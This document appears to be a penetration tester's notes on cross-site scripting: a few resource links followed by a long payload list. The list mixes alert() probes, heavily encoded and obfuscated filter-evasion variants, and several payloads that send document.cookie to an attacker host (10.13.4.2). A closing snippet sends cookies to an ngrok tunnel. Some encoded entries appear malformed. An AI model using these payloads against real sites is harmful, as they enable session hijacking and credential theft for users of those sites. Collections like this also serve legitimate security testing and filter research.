<https://www.youtube.com/watch?v=GcznQUsNW3s&list=PLJ18l2m4Gsa_d-WrmQYi6AcjQCxRZ0wG1&index=49> (automation)
<https://portswigger.net/web-security/cross-site-scripting/cheat-sheet> (<33)
<https://www.youtube.com/watch?v=MFrDux4kfsY>
<https://github.com/payloadbox/xss-payload-list>
<http://www.jsfuck.com/#>
<https://xss.js.org/#/xss05>

Try it on:
- URL query, fragment & path;
- all input fields.
![[Pasted image 20251102205225.png]]

This one might need to try manually in burp:
<script
>alert('1');</script>
<img src=x onerror="eval('alert(1)')"/>

Payload list XSS:
`<svg/onload=confirm(1)>`
`&lt;sCrIpt&gt;\u0061\u006c\u0065\u0072\u0074&#40;1&#41;&lt;&#47;sCrIpt&gt;`
`"><svg onload=&#97;&#108;&#101;&#114;&#116;(1)>`
`<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>`
`"><svg onload=alert(1)>`
`<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//`
`%00script%00alert(1)%00/script%00`
`<script>alert(1)</script>`
`<script>\u0061\u006c\u0065\u0072\u0074(1)</script>`
`<script>\u0061\u006c\u0065rt(1)</script>`
`<img src=x onerror="\u0061lert(1)"/>`
`--'`"><img src=x>kdskf${{7*7}}`
`<img src=x onerror="eval('\141lert(1)')"/>`
`<img src=x onerror="\141\154\145\162\164(1)">`
`<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">`
`💋img src=x onerror=\u0061\u006c\u0065rt(document.domain)//💛`
`💋img src=x onerror=alert(document.domain)//💛`
`💋img src=x onerror=alErT(document.domain)//💛`
`💋Img Src=x Onerror=alErT(document.domain)//💛`
`<img src=x onerror="\u0065\u0076\u0061\u006c('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')"/>`
`<svg//////onload=\141\154\145\162\164(1)>`
`<script>\46\43\170\66\61\73\46\43\170\66\143\73\46\43\170\66\65\73\46\43\170\67\62\73\46\43\170\67\64\73(1)</script>`
`%u003cscript%u003ealert(1)%u003c/script%u003e`
`<img src=x onerror="alert(1)">`
`"><img src onerror=alert(1)>`
`<svg/onload=alert(1)>`
`javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
`<img src="//10.13.4.2/xss.png" onerror=alert(document.domain)>`
`<script>document.location='//10.13.4.2/xss.php?cookie='+document.cookie;</script>`
`"autofocus onfocus=alert(1)//`
 `javascript:alert(1)`
`</script><script>alert(1)</script>`
`'-alert(1)-'`
`\'-alert(1)//`
`javascript:alert(1)`
`';alert('xss');//`
`test"><img>`
`-->"><img src=x onerror=alert(location)//`
`-->"><input>`
`&lt;script&gt;document.location='<http://10.13.4.2/xss.php?cookie='+document.cookie;&lt;/script&gt;>`
`<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`
`<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`
`<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`
`<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`
`<BODY onload!#$%&()*~+-_.,:;?@[/|\]^=alert("XSS")>`
`<svg/onload=eval(unescape(/var%20img%20%3D%20new%20Image%28%29%3B%20img.src%20%3D%20%22http%3A%2F%2F10.13.4.2%2Fsteal.php%3Fcookie%3D%22%20%2B%20document.cookie%3B/.source))>`
`<iframe src=<http://10.13.4.2/report> height"0" width="0"></iframe>`
`<script>new Image().src="<http://10.13.4.2/icon.jpg?output=>"+document.cookie;</script>`
`<iframe src=http%3A%2F%2F10.13.4.2%2Freport height%220%22 width%3D%220%22%3E%3C%2Fiframe%3E`
`<iframe src=68747470733a2f2f31302e31332e342e32302f7265706f72742068656164226231207769647468223e3c2f696e666f726d3e`
`<iframe src=aHR0cDovLzEwLjEzLjQuMi9yZXBvcnQgaGVpZ2h0IjAiIHdpZHRoPSIwIj48L2lmcmFtZT4=`
`<iframe src=104 116 104 058 47 47 49 48 46 49 51 46 52 46 50 48 47 114 101 112 111 114 116 32 104 101 97 100 116 39 32 119 105 100 116 104 34 62 60 47 105 110 102 114 109 62`
`eval(String.fromCharCode(60, 105, 102, 114, 97, 109, 101, 32, 115, 114, 99, 61, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 51, 46, 52, 46, 50, 47, 114, 101, 112, 111, 114, 116, 32, 104, 101, 105, 103, 104, 116, 61, 34, 48, 34, 32, 119, 105, 100, 116, 104, 61, 34, 48, 34, 62, 60, 47, 105, 102, 114, 97, 109, 101, 62))`
`<iframe src=http%3A%2F%2F10.13.4.2%2Freport height%220%22 width%3D%220%22%3E%3C%2Fiframe%3E`
`3c696e666f726d207372633d68747470733a2f2f31302e31332e342e32302f7265706f7274206865616468742231207769647468223d223022253e3c2f696e666f726d3e`
`<iframe src=http%3A%2F%2F10.13.4.2%2Freport height%220%22 width%3D%220%22%3E%3C%2Fiframe%3E%00<iframe src=<http://10.13.4.2/report> height"0" width="0"></iframe>`
`<iframe src=http%3A%2F%2F10.13.4.2%2Freport height%220%22 width%3D%220%22%3E%3C%2Fiframe%3E`
`<script>document.location='<http://10.13.4.2/report';></script>`
`%3cscript%3ealert(%22XSS%22)%3c%2fscript%3e`
`<script>alert("XSS")</script>`
`<script>alert(String.fromCharCode(88,83,83))</script>`
`<img src=x onerror=alert(String.fromCharCode(88,83,83));>`
`<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>`
`<body onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>`
`<body onload=eval(atob(%27YWxlcnQoXCJYU1NcIik%27))>`
`<body onload=eval(decodeURIComponent(%27%61%6c%65%72%74%28%27%58%53%53%27%29%27))>`
`<body onload=eval(decodeURIComponent(%27%61%6c%65%72%74%28%22XSS%22%29%27))>`
`<ScRiPt>alert('1');</sScRiPt>`
`<ScRiPt>alert('1');`
`<ScRiPt/random>alert('1');</sScRiPt>`
`<Script/random>alert('1');</script>`
`<scr<script>ipt>alert('1')</scr<script>ipt>`
`<scr\x00ipt>ipt>alert('1')</scr\x00ipt>`
`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>`
`<form id=x></form><button form="x" formaction="javascript:alert('1')">send</button>`
`<object data="//10.13.4.2/xss.swf">`
`<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`
`<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`
`javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>` 
`<svg/onload=document.location.href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>` 
`𓅂='',𓂀=!𓅂+𓅂,𓁄=!𓂀+𓅂,𓊎=𓅂+{},𓆣=𓂀 [𓅂++],𓊝=𓂀[𓇎=𓅂],𓏢=++𓇎+𓅂,𓆗=𓊎[𓇎+𓏢 ],𓂀[𓆗+=𓊎[𓅂]+(𓂀.𓁄+𓊎)[𓅂]+𓁄[𓏢]+𓆣+ 𓊝+𓂀[𓇎]+𓆗+𓆣+𓊎[𓅂]+𓊝][𓆗](𓁄[𓅂]+𓁄[ 𓇎]+𓂀[𓏢]+𓊝+𓆣+'𓅂 𓏢 𓂀 𓁄 𓆣 𓊝 𓇎')``
`[𓅂++],𓊝=𓂀[𓇎=𓅂],𓏢=++𓇎+𓅂,𓆗=𓊎[𓇎+𓏢`

Remember to use: <http://www.jsfuck.com/#>
and: <https://hackvertor.co.uk/public#>

```
<script>new Image().src = "<http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=>" + document.cookie;</script>
```